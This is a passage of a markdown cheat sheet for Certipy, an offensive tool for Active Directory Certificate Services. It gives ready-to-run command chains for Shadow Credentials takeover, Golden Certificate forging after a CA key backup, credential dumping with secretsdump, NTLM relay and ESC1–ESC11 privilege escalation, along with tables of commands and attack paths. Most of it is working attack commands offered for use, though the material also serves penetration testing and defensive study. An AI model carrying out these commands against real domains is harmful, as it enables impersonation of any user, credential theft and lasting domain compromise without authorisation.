certipy shadow auto -u attacker@domain.local -p 'Password123' \
    -account domainadmin

# 2. Authenticate
certipy auth -pfx domainadmin.pfx -dc-ip 10.10.10.1

# 3. Use credentials
secretsdump.py -hashes :<hash> domain.local/domainadmin@dc01
```

### Golden Certificate Persistence

```bash
# 1. Backup CA (requires CA admin)
certipy ca -u admin@domain.local -p 'Password123' -ca 'CORP-DC-CA' -backup

# 2. Forge certificate for any user at any time
certipy forge -ca-pfx ca.pfx -upn administrator@domain.local \
    -subject 'CN=Administrator,CN=Users,DC=domain,DC=local'

# 3. Authenticate whenever needed
certipy auth -pfx administrator_forged.pfx -dc-ip 10.10.10.1
```

---

## Certificate Management

### Convert Certificate Formats

```bash
# Extract certificate from PFX (no private key)
certipy cert -pfx user.pfx -nokey -out user.crt

# Extract private key from PFX (no certificate)
certipy cert -pfx user.pfx -nocert -out user.key

# Create PFX from certificate and key
certipy cert -cert user.crt -key user.key -out user.pfx

# Export with password protection
certipy cert -pfx user.pfx -export -out user_password.pfx -password 'NewPassword'
```

### View Certificate Details

```bash
# Using OpenSSL
openssl pkcs12 -in user.pfx -info -nodes -passin pass:

# View certificate subject
openssl pkcs12 -in user.pfx -nokeys -passin pass: | openssl x509 -noout -subject

# View Subject Alternative Name
openssl pkcs12 -in user.pfx -nokeys -passin pass: | openssl x509 -noout -ext subjectAltName

# View all certificate details
openssl pkcs12 -in user.pfx -nokeys -passin pass: | openssl x509 -noout -text
```

### Kerberos Ticket Management

```bash
# View ccache contents
klist -c user.ccache

# Convert ccache to kirbi (for Rubeus/Mimikatz)
certipy ptt -ccache user.ccache

# Convert kirbi to ccache
ticketConverter.py user.kirbi user.ccache
```

---

## BloodHound Integration

### Generate BloodHound Data

```bash
# Generate BloodHound-compatible output
certipy find -u user@domain.local -p 'Password123' -dc-ip 10.10.10.1

# Output: *_Certipy.zip (import into BloodHound CE)
```

### BloodHound CE Attack Paths

The Certipy data adds these attack paths to BloodHound:

| Edge | Description |
|------|-------------|
| `ADCSESC1` | ESC1 attack path |
| `ADCSESC2` | ESC2 attack path |
| `ADCSESC3` | ESC3 attack path |
| `ADCSESC4` | ESC4 attack path |
| `ADCSESC9a` | ESC9 attack path (variant A) |
| `ADCSESC9b` | ESC9 attack path (variant B) |
| `ADCSESC10a` | ESC10 attack path (variant A) |
| `ADCSESC10b` | ESC10 attack path (variant B) |
| `CanAbuseUPNCertMapping` | UPN certificate mapping abuse |
| `CanAbuseWeakCertBinding` | Weak certificate binding abuse |

### Importing to BloodHound CE

1. Generate data: `certipy find -u user@domain -p pass -dc-ip IP`
2. Open BloodHound CE
3. Go to File > Import
4. Select the `*_Certipy.zip` file
5. View AD CS attack paths in Analysis

---

## Command Reference

### All Commands Overview

| Command | Description |
|---------|-------------|
| `certipy find` | Enumerate AD CS, find CAs and templates |
| `certipy req` | Request a certificate from a CA |
| `certipy auth` | Authenticate using a certificate (PKINIT) |
| `certipy cert` | Manage certificates (convert, extract) |
| `certipy ca` | Manage CA (backup, add officer, enable templates) |
| `certipy template` | Manage certificate templates |
| `certipy relay` | NTLM relay to AD CS web endpoints |
| `certipy shadow` | Shadow Credentials attack |
| `certipy forge` | Forge certificates (Golden Certificate) |
| `certipy ptt` | Pass-the-ticket (convert ccache to kirbi) |
| `certipy account` | Create/delete machine accounts |

### Common Options

| Option | Description |
|--------|-------------|
| `-u` | Username (user@domain.local format) |
| `-p` | Password |
| `-hashes` | NTLM hash (LM:NT or :NT) |
| `-k` | Use Kerberos authentication |
| `-dc-ip` | Domain controller IP address |
| `-target` | Target host for Kerberos |
| `-pfx` | PFX certificate file |
| `-ca` | Certificate Authority name |
| `-template` | Certificate template name |

### Quick Reference

| Task | Command |
|------|---------|
| Find all CAs | `certipy find -u user@dom -p pass -dc-ip IP` |
| Find vulnerable | `certipy find -u user@dom -p pass -dc-ip IP -vulnerable` |
| Request cert | `certipy req -u user@dom -p pass -ca CA -template TPL` |
| Request with SAN | `certipy req ... -upn admin@dom` |
| Authenticate | `certipy auth -pfx file.pfx -dc-ip IP` |
| Get TGT only | `certipy auth -pfx file.pfx -dc-ip IP -no-hash` |
| Shadow creds | `certipy shadow auto -u user@dom -p pass -account target` |
| Relay attack | `certipy relay -ca ca.domain.local` |
| Forge cert | `certipy forge -ca-pfx ca.pfx -upn admin@dom` |
| Backup CA | `certipy ca -u admin@dom -p pass -ca CA -backup` |
| Add officer | `certipy ca -u admin@dom -p pass -ca CA -add-officer user` |

---

## ESC Attack Summary Table

| ESC | Vulnerability | Privilege Required | Impact |
|-----|--------------|-------------------|--------|
| ESC1 | SAN in request allowed | Enrollment rights | Any user impersonation |
| ESC2 | Any Purpose/No EKU | Enrollment rights | Authentication as self |
| ESC3 | Enrollment agent abuse | Enrollment rights | Any user impersonation |
| ESC4 | Template write access | Template write | Any user impersonation |
| ESC5 | PKI object write access | Object write | Various |
| ESC6 | CA SAN flag enabled | Enrollment rights | Any user impersonation |
| ESC7 | CA manage permissions | ManageCA/Certs | Any user impersonation |
| ESC8 | HTTP relay | Coercion ability | Machine impersonation |
| ESC9 | No security extension | GenericWrite on user | User impersonation |
| ESC10 | Weak certificate mapping | GenericWrite on user | User impersonation |
| ESC11 | RPC relay (ICPR) | Coercion ability | Machine impersonation |
| Golden | CA key backup | CA admin access | Persistent domain access |
| Shadow | KeyCredentialLink write | GenericWrite on target | Target impersonation |

---

## References

### Primary Sources

- [Certipy GitHub Repository](https://github.com/ly4k/Certipy)
- [Certipy PyPI Package](https://pypi.org/project/certipy-ad/)

### Research Papers and Blog Posts

- [Certified Pre-Owned - SpecterOps Whitepaper](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Certipy 2.0 - BloodHound, New Escalations, and More](https://research.ifcr.dk/certipy-2-0-bloodhound-new-escalations-shadow-credentials-golden-certificates-and-more-34d1c26f0dc6)
- [Certipy 4.0 - ESC9 & ESC10](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-attack-paths-and-more-6adaef1a11e8)
- [AD CS Relay Attacks - ESC8](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
- [Shadow Credentials - Elad Shamir](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- [AD CS Attack Paths in BloodHound](https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-1-799f3d3b0a64)

### Related Tools

- [Impacket](https://github.com/SecureAuthCorp/impacket) - Python network protocols
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) - AD attack path visualization
- [Rubeus](https://github.com/GhostPack/Rubeus) - Windows Kerberos attacks
- [PetitPotam](https://github.com/topotam/PetitPotam) - NTLM coercion via EfsRpc
